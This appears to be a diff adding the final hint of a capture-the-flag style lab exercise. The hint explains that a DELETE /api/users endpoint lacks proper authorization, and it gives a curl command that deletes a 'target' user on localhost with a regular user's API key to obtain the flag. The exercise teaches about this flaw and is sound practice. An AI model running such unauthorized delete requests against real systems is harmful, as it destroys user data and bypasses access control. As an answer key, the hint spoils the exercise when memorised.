@@ -1,0 +1,10 @@
+💡 Hint 3: Complete Solution
+
+The DELETE /api/users/<user_id> endpoint exists but isn't protected properly.
+
+Step-by-step:
+1. Use your regular user API key: user_key_12345
+2. Send DELETE request to remove the 'target' user:
+   curl -X DELETE http://localhost:4003/api/users/target -H 'API-Key: user_key_12345'
+
+The flag will be returned in the response!
